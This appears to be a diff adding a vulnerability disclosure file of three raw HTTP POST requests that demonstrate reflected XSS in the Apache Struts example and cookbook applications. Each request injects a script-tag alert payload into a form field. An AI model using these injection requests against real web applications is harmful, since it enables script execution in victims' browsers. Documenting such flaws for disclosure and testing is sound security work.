@@ -1,0 +1,59 @@
+-----
+Reflected XSS 
+
+POST /struts-examples/upload/upload-submit.do?queryParam=Successful HTTP/1.1
+
+Host: SERVER_IP:8080
+User-Agent: Struts-examples XSS-TEST
+Content-Type: multipart/form-data; boundary=---------------------------41701
+161044225432961947041
+Content-Length: 481
+
+Post Data:
+----------
+-----------------------------41701161044225432961947041\r\n
+Content-Disposition: form-data; name="theText"\r\n
+\r\n
+<script>alert("SecPod-XSS-TEST")</script>\r\n
+-----------------------------41701161044225432961947041\r\n
+Content-Disposition: form-data; name="theFile"; filename=""\r\n
+Content-Type: application/octet-stream\r\n
+\r\n
+\r\n
+-----------------------------41701161044225432961947041\r\n
+Content-Disposition: form-data; name="filePath"\r\n
+\r\n
+\r\n
+-----------------------------41701161044225432961947041--\r\n
+
+
+-----
+Reflected XSS 
+
+POST /struts-cookbook/processSimple.do HTTP/1.1
+
+Host: SERVER_IP:8080
+User-Agent:Struts-cookbook XSS-TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+Post Data:
+----------
+name=XYZ&secret=XYZ&color=red&confirm=on&rating=1&message=%3Cscript%3Ealert
+%28%22SecPod-XSS-TEST%22%29%3C%2Fscript%3E&
+
+
+-----
+Reflected XSS 
+
+POST /struts-cookbook/processDyna.do HTTP/1.1
+
+Host: SERVER_IP:8080
+User-Agent:Struts-cookbook XSS-TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+
+Post Data:
+----------
+name=ZYZ&secret=&color=red&message=%3Cscript%3Ealert%28%22SecPod-XSS-TEST
+%22%29%3C%2Fscript%3E&
